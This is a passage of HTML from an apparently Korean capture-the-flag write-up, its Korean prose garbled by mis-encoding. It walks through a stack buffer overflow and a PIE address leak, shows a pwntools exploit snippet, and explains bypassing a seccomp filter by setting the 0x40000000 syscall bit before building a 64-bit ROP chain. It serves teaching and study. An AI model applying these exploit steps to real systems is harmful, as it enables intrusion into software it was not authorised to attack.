ë°œìƒí•œë‹¤.</li>\n<li>ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•  ìˆ˜ ìˆë‹¤ë©´ ë©”ëª¨ë¦¬ ì£¼ì†Œìƒì— ì¡´ì¬í•˜ëŠ” PIE ì£¼ì†Œë¥¼ ë¦­ì„ í•  ìˆ˜ ê°€ ìˆë‹¤.</li>\n</ul>\n<h2 id=\"ë©”ëª¨ë¦¬-ì£¼ì†Œ-ë…¸ì¶œ-ìŠ¤íƒ-ë²„í¼-ì˜¤ë²„í”ŒëŸ¬ìš°\" style=\"position:relative;\"><a href=\"#%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%A3%BC%EC%86%8C-%EB%85%B8%EC%B6%9C-%EC%8A%A4%ED%83%9D-%EB%B2%84%ED%8D%BC-%EC%98%A4%EB%B2%84%ED%94%8C%EB%9F%AC%EC%9A%B0\" aria-label=\"ë©”ëª¨ë¦¬ ì£¼ì†Œ ë…¸ì¶œ ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”ŒëŸ¬ìš° permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë©”ëª¨ë¦¬ ì£¼ì†Œ ë…¸ì¶œ, ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”ŒëŸ¬ìš°</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 517px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB90lEQVQozzXQ3U7aABTA8T6GM44WSXZhWJQPhWRjizphUEBsaWnpB/SDtqAGvViyiyWLyV5hUbM9iY/gO7X/pTgv/jkXJzn55Qi7VZVS3aB0aFOsKnySTcb+DefWip4e0TcTRs4V5WYbqfKZEy3gwlu/ll1463Tk3dAa3n0dPfwVhEKth9jQERsmhaM+HW3MLE6YJQnz5RI3TvAvL9lvNNkqlpBHCrMgxPUCXD/IXD9IHS9geP/woD8/2YJ40EaqDZCq54j1Lp+6Moo+RZ1YKJum6FOX8kGd7UKJ446Majqopp2X5SmGg/z7/s/k+ckXxFofqWEgNaaIR0M6yhg3iHCC6GX6C7xoyX6twZvCLvJozCyMX/eZG0SpE8Scjn901cdHQRAPzhBrA8TqALHWppULNXMj3CgNC81yKVfqbIsljts9VMNGNay8TDWsNBeehHeTs49TQciPSU0TqWm9CDWdWbTEjZY4ucQLX4TVI7Z2inRGKvYixgoirDDKrDBKp2HMSfJLG8Tf/wurfaTakML+Ka2ezMXM26RECaofoi9iyh9avN17j95TWE0DFpMZvmpnoeaki4mHYf7UnMntq9Da/LFQ6dLpDfCjFZbrMbHnGPMAcx6yVzlkp/gOT7P5trplHV5yE15lt4vrdO1f4Xy51rxBIvwDYiYr3jAI4BwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/f38e0e5c1cbc39e9dd1e1a83cbea7750/fa2f5/12.png\"\n        srcset=\"/static/f38e0e5c1cbc39e9dd1e1a83cbea7750/e9ff0/12.png 180w,\n/static/f38e0e5c1cbc39e9dd1e1a83cbea7750/f21e7/12.png 360w,\n/static/f38e0e5c1cbc39e9dd1e1a83cbea7750/fa2f5/12.png 517w\"\n        sizes=\"(max-width: 517px) 100vw, 517px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>buf</p>\n<ul>\n<li>buf[140] ë°”ì´íŠ¸ë¥¼ ì±„ìš´ í›„ ì‚¬ì´ì¦ˆê°’ì´ integer issueë¡œ ì¸í•´ <code class=\"language-text\">0x1008b</code> ê¹Œì§€ ì…ë ¥ì„ ë°›ì„ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— í•´ë‹¹ PIE ì£¼ì†Œ ë¶€ë¶„ê¹Œì§€ ë®ì„ ìˆ˜ ìˆê²Œ ëœë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 428px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAo0lEQVQI122NvQ7CIACE+/6P46CJiUkTFwfjpLFVC20VoVB+iqViBDTUxaGXmy539yXZHO5maL+ARZoXaV6uwXF5Pa3gfVPj2xOTF8YTRshK+U7AtqEX3gLFAVUVo2diqTJEeKmC9yGEz5S8j3lyyLqqltpY3AncMz50UMNmoNwq/bAIacaMc/Hk386NY0r7spQN6YUw8TMEH4GROfbCDzJJ/gIBieHzConq5AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./13.png\"\n        title=\"./13.png\"\n        src=\"/static/97430976775b5255699cc9cff1379c1a/47730/13.png\"\n        srcset=\"/static/97430976775b5255699cc9cff1379c1a/e9ff0/13.png 180w,\n/static/97430976775b5255699cc9cff1379c1a/f21e7/13.png 360w,\n/static/97430976775b5255699cc9cff1379c1a/47730/13.png 428w\"\n        sizes=\"(max-width: 428px) 100vw, 428px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"í•´ê²°-ë°©ì•ˆ\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"í•´ê²° ë°©ì•ˆ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í•´ê²° ë°©ì•ˆ</h1>\n<p>leak</p>\n<ul>\n<li>ë©”ëª¨ë¦¬ ì£¼ì†Œê°€ ì¶œë ¥ì´ ê°€ëŠ¥í•œ ê³³ì€ ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì´ í‹€ë ¸ì„ ê²½ìš° bufì˜ ê³µê°„ì„ ì¶œë ¥í•´ì£¼ëŠ”ë° ì´ë•Œ ë„ ë°”ì´íŠ¸ ê¹Œì§€ ì¸ì‹í•˜ì—¬ ì¶œë ¥í•˜ëŠ” strlen í•¨ìˆ˜ì˜ íŠ¹ì„±ì„ ì´ìš©í•˜ì—¬ PIE ì£¼ì†Œ ê¹Œì§€ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ë®ê³  ì¶œë ¥ì„ í•˜ê²Œ ëœë‹¤ë©´ ì£¼ì†Œë¥¼ ë…¸ì¶œ ì‹œí‚¬ ìˆ˜ ìˆë‹¤.</li>\n<li>í•´ë‹¹ ë…¸ì¶œ ëœ ë¶€ë¶„ìœ¼ë¡œ PIE ì£¼ì†Œ ì²« ë²ˆì§¸ ì—”íŠ¸ë¦¬ ë¶€ë¶„ì„ ì•Œ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì˜¤í”„ì…‹ì„ ë°”íƒ•ìœ¼ë¡œ í•„ìš”í•œ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•  ìˆ˜ ê°€ ìˆê² ë‹¤.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># buffer size ++</span>\n<span class=\"token keyword\">print</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># size = 0xa0</span>\npayload <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">140</span>\npayload <span class=\"token operator\">+=</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">+=</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># PIE leak</span>\npayload <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">140</span>\npayload <span class=\"token operator\">+=</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\npayload <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"): \"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span>\npie_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlog<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"PIE_leak : \"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pie_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># lib base</span>\npie_base <span class=\"token operator\">=</span> pie_addr <span class=\"token operator\">-</span> <span class=\"token number\">0xbb7</span>\nlog<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"PIE_base : \"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pie_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ol>\n<li>buf size ì¦ê°€\n<ul>\n<li>ìŠ¤íƒ ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ë²„ê·¸ë¥¼ ë§Œë“¤ê¸° ìœ„í•´ ê³µë°± ë¬¸ìë¥¼ ì§‘ì–´ë„£ì–´ <code class=\"language-text\">v7++</code> í•˜ì—¬ sizeê°€ <code class=\"language-text\">0x1008b</code> ìƒíƒœë¡œ ë§Œë“ ë‹¤.</li>\n</ul>\n</li>\n<li>PIE leak ê³µê°„ ë§Œë“¤ê¸°\n<ul>\n<li>PIE ì£¼ì†Œ ê°’ì€ buf[140]ì„ ì§€ë‚˜ì„œ 20 ë°”ì´íŠ¸ ìœ„ì¹˜ì— ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— ì‚¬ì´ì¦ˆë¥¼ ë³€ê²½í•´ì¤€ë‹¤.</li>\n</ul>\n</li>\n<li>PIE leak\n<ul>\n<li>size, v7ì„ 16bit ìµœëŒ€ ì •ìˆ˜ ê°’ìœ¼ë¡œ ë°”ê¿”ì£¼ê³  160 ë°”ì´íŠ¸ ì „ë¶€ ë°ì´í„°ë¥¼ ì±„ì›Œ PIE ì£¼ì†Œë¥¼ leakí•  ìˆ˜ ìˆëŠ” ìƒíƒœë¡œ ì˜¤ë²„ í”Œë¡œìš°ë¥¼ í•œë‹¤.</li>\n</ul>\n</li>\n<li>160 ë°”ì´íŠ¸ê¹Œì§€ ì‘ë‹µì„ ë°›ì€ í›„ì— PIE ì£¼ì†Œ ê°’ì„ ê¸ì–´ì™€ ë² ì´ìŠ¤ ì£¼ì†Œë¥¼ êµ¬í•˜ì</li>\n</ol>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB8ElEQVQoz4XQwWvTUBwH8PwdS/Ne8l6S5jVpkuYlaZs2XZu+Jmu3ZtVtgm6HroOh3aAyy+wUJuLw4sGzMLx7UUQRRBR2UOZdL4Lgxf9DKmVjhzH48ON3+cL39+OK4bUwSquNtNJYDpu9oJ6Ww47jN20vcnyGNU9S6WU4041Yp1soBo12u8JYtdogFs3ZLrEp0nQga1Ah/2mzKatnuCyhvkd5EShUVSwF83NzgsBneD7DCxAKQmY6gSAAIAg8ABDK2hnOSbbpjUOru6NvPDKu79orEz254yyPjHRsJQOzt2/Gm2bvvhFvOSsT0hpArJ6H3eFb/+Fpfu3IH72z1p+XHv9wdl/7B9/o+LO3f1J59te9+95/cGoOjuneR3rvE0AylMksbG+/cZ/+MW+/Kky+GoOXhcOf9vjE2vviPflVGH3Ibx7Tg+/u0W81Hur9F3J9A0AIldwsbDT6+cWhwfrm4k4+2bLTUb55i7A+rq0jr42cJg5WlWiA3Rh7CyIpXKhdrrBSuZjViCiJIkIII1UjEsYChBBhiGQgSgACKOEpOXvhYVW2Wo87xHRNN3BKNd0pZpAGFB2q+rSekpsuZ/v02nOcX1ta6KbzLAkj1uos1VhLyRkAK0C+GhdGN4P5NG6tUT/JGlWTMoUEkuqjbPFK/wCJkpMg5fLTOQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./14.png\"\n        title=\"./14.png\"\n        src=\"/static/355ca7adef80d841c873aed445daeda3/37523/14.png\"\n        srcset=\"/static/355ca7adef80d841c873aed445daeda3/e9ff0/14.png 180w,\n/static/355ca7adef80d841c873aed445daeda3/f21e7/14.png 360w,\n/static/355ca7adef80d841c873aed445daeda3/37523/14.png 720w,\n/static/355ca7adef80d841c873aed445daeda3/f96df/14.png 849w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>leak pie</p>\n<h2 id=\"64bit-rop\" style=\"position:relative;\"><a href=\"#64bit-rop\" aria-label=\"64bit rop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>64bit ROP</h2>\n<h2 id=\"seccomp_filter_mode-ìš°íšŒ\" style=\"position:relative;\"><a href=\"#seccomp_filter_mode-%EC%9A%B0%ED%9A%8C\" aria-label=\"seccomp_filter_mode ìš°íšŒ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>seccomp_filter_mode ìš°íšŒ</h2>\n<ul>\n<li>NXê°€ ì¼œì ¸ìˆê³  Full Relroë¼ GOT overwriteê°€ ì•ˆë˜ê¸° ë•Œë¬¸ì— ROPë¥¼ í•˜ì—¬ íŠ¹ì • í–‰ìœ„ë¥¼ í•´ì•¼ í•œë‹¤. í•˜ì§€ë§Œ ì¤‘ìš”í•œ ì‚¬ì‹¤ì€ ì•ì—ì„œ ì–¸ê¸‰í•œ SECCOMP_FILTERê°€ ê±¸ë ¤ ìˆê¸° ë•Œë¬¸ì— open, execve.. system callì„ ì‚¬ìš©í•  ìˆ˜ ì—†ë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 662px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 76.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB5klEQVQoz32S227jIBRF/SuNE8fGBg5Xgw0YX+Jc2zTNSPMy//8doyaVRtM2lZa2hMRmSYeTOPEcwEW+7dXzoJ4D3wfaDe4a/e8IAyrrFdIZ0qtSZ3fQPxJQO2Vby7TBmoOTEGrhO9CBKkeloIxjxkBy6xiXWooVIssC30m4mGlJsDBUNyAbyk2KaFqQO8uC3pKsEF3ejrf8IOHixZld25yDv8buTdshQ//d+IGEih2GGljP+MDlQJgn3KY5Xt1sq4K+54PnEkx64IZCFCpS1WgbGTPShrqN0gZeO2UDZjrN8TflkgwEFIUOeAfCC90LHXXbrSv27kc0K+GhGWCs62DM0ZhNcNsuHPthb10va6dMKKn61vlRzqoOalMJ46g5ivYo2lcTTn6+xMMkAypZ+sPAvNjWoBmPQm2UGoWMeQU55gURWQVrRNN1tXggTxjbeGGCGTqzn6brdjyN43GI8zjudofX/XTow0TgwcAEmSzRnRpP8bxzx4N/2TSzxzoIP9phsMPcjh3Yp9vnfS4bmDsbrI3euLFpe9t6oYIyre19OwLRKIeq4On7bn0maeQWQCwR3JdhXTIELKvwIkcpKhcFWuTFU16kOfpKAuoP5WfGLyAuTLwJ+atur1Se8moq8KbA8w/8BUXvruJwz4CqAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./15.png\"\n        title=\"./15.png\"\n        src=\"/static/4fdd14a66a089020e2eee81d4a03a1e6/be86f/15.png\"\n        srcset=\"/static/4fdd14a66a089020e2eee81d4a03a1e6/e9ff0/15.png 180w,\n/static/4fdd14a66a089020e2eee81d4a03a1e6/f21e7/15.png 360w,\n/static/4fdd14a66a089020e2eee81d4a03a1e6/be86f/15.png 662w\"\n        sizes=\"(max-width: 662px) 100vw, 662px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>do_syscall_64</p>\n<ul>\n<li>syscall numì„ ë‚˜íƒœëŠ” <code class=\"language-text\">unsigned long</code> íƒ€ì…ì˜ <code class=\"language-text\">nr</code> ë³€ìˆ˜ê°€ <code class=\"language-text\">sys_call_table</code> ë°°ì—´ì˜ ì¸ë±ìŠ¤ë¡œ ì‚¬ìš©ë˜ë©° <code class=\"language-text\">nr &amp; 0x40000000</code> ì¡°ê±´ ë¶€ë¶„ì„ ë§Œì¡±í•˜ì—¬ 0ì´ ì•„ë‹ˆë¼ë©´ <code class=\"language-text\">nr &amp; ~0x40000000</code> ì—ì„œ nr ê°’ì˜ 31 ë²ˆì§¸ ë¹„íŠ¸ë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ê²Œ ëœë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAACAklEQVQoz0XF20+SYQDA4e8vc5k5YKloM7WRWTeCpjlpYshyQwubwIWYZpIrzOxgHDwg+qHJZ2oXSTYECSSU1mY22zy0Dqu9v6Y3XTx7pLJgx596pY/mZbdoXhnkmHHFjSHSi07uRq+4KHphQzPkRP3AgeqEHbXbSfGYDX2kh4qQTdQu9HBh9s5f6arSx/fDI/EplSUVS7AZT7K9scnu/h5jcYUPu0kKG/zUlGW5VpehuT5LS1OW+uoc2hs+9n5+oScaIJZLi96oH0knd4vR+Dyja7IYXp3G8zbISHQGz/osN5c83HvvQ+XoR2vyUWH1Umn1UdXpo9wSoLi3n8epGZoiA6IvGsCo3BfS2cl28vwt5E+YKZhqo2DKwunJNvL8JgrH28gPmNHOWSiab0Ujt6KeNaGeMaEJmygJW8jztqCasHAq0HqyVB22i/H0MoHEoni+NseztTATMQV/6jUdb54wnJxG3T1IqTFIVfsUOmuQix1BqswhSlyDvMwucH3RLUbWZcxLQ0KqU+5yeHAgtlMfSceTpBJJvqVzHB3s8zT2ivhOgjMNXmrOZWg0pGkyZDA2ZjDotigxe/n6Ywfnqo/c5y0x8G4cqTRo/XUl7ES/4BL6iItjtREXl2QHlaEuLs85KBrrROPpQvXIhurhf8XeTmrCdsqnb4lq2c750O3f/wDC9okzbA4jBwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./16.png\"\n        title=\"./16.png\"\n        src=\"/static/b4a084b1651f495c0e3a253747b8fbf3/37523/16.png\"\n        srcset=\"/static/b4a084b1651f495c0e3a253747b8fbf3/e9ff0/16.png 180w,\n/static/b4a084b1651f495c0e3a253747b8fbf3/f21e7/16.png 360w,\n/static/b4a084b1651f495c0e3a253747b8fbf3/37523/16.png 720w,\n/static/b4a084b1651f495c0e3a253747b8fbf3/d0cc0/16.png 732w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>bit</p>\n<ul>\n<li>seccomp_filterì—ì„œëŠ” system call numì˜ ì˜ˆì™¸ë¥¼ ê²€ì¦í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— <code class=\"language-text\">0x40000000|systemcall num</code> or ì—°ì‚°ì„ í•˜ì—¬ ì›í•œëŠ” ì‹œìŠ¤í…œ ì½œ ë²ˆí˜¸ë¥¼ ì‚½ì…í•˜ì—¬ ìš°íšŒë¥¼ í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<h2 id=\"64bit-rop-1\" style=\"position:relative;\"><a href=\"#64bit-rop-1\" aria-label=\"64bit rop 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>64bit ROP</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAACyklEQVQoz22OyWsTcRzFf5mig3+CtWnizGRfm2VmktmSSaZJ27SZNNrETKzaFrRCPHgRN0RBKBSxUEGKCyJiMhFsanuwUQ96ED14EMGLeNLxqrkoaONX0oMH8fDhPT7v8pBaWIXDMxtQrqzB1NQDKBXrsL/YgAn1AQjS1WYgQvIhOqXScZXv21HF0qMjGB3PYXxCxTgpjzFcDouLeYzlxzBPII2hnHq6VdLOrxVLZ1opZb6VT8y2RlJHW8OjJ1rpTG09O3ZyPZ2tPZOVY6fK2jzyh0VEc8NIkMcRn8whls8iTsqhmJBFbr+EUGHy8bfpQ+1O+cBmR6u2O5Xpp50D2pNOz1W0dqd6sP11srj5IzNy6ywrpLiYWM0y/JQiylVFSGpKTCgP8wlNiYultG9ITaP8vtl6uTpX31+ZaUjJMX2clXWFH9blTEGXUhO9bEjpvJ7K7GuKstqMSzmd5Uf1QCSp+8OJpjco6v5QoukLSQ8dHukh0rT3j2q1jy/y+Q8TCCG0fA52Pa0Drl4DfH4R8KUFwK+vAH7/LuArNwC/dBHwO7cBP3Ec8AvnYOfCFcDfvQUsPaIglz+CUFKZAzlzBES5+N0TZD75QtwXb5gzJmjRkGnR6HXfUNwIRATDHWAMl582/GHO8ARZwx1gP3mG2K+egLDhd33u80aRCUVj0laYpX+FWRb2WCkYJO2wh7BBwe0D3uGG3YQNBgk7mAkbmAn79v43tzsFFsr35nUbTI2bgBDDZX7TfAIiMeG3mXB0LZSrO0A6u2VfsCu5fN1+0tm1Uq5tb6Gc/+D6aaEcYLUFXz5pgmnpMiAUZhMQ5XiIsHEY2EuChbTBAGmDgscLvNMF/b0HpA0G/8/WIEmBlfK+er4KpuUFQIjlJyEmjgPDjYHVFgXCwYDFTkMlIILs4cBsp4G0M0DY6f/AbBH2KJBO4dX6PTAtXgT0B08nNLlIKuGKAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./17.png\"\n        title=\"./17.png\"\n        src=\"/static/757e68f465c40d8cc71ded460c601722/37523/17.png\"\n        srcset=\"/static/757e68f465c40d8cc71ded460c601722/e9ff0/17.png 180w,\n/static/757e68f465c40d8cc71ded460c601722/f21e7/17.png 360w,\n/static/757e68f465c40d8cc71ded460c601722/37523/17.png 720w,\n/static/757e68f465c40d8cc71ded460c601722/1e088/17.png 840w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        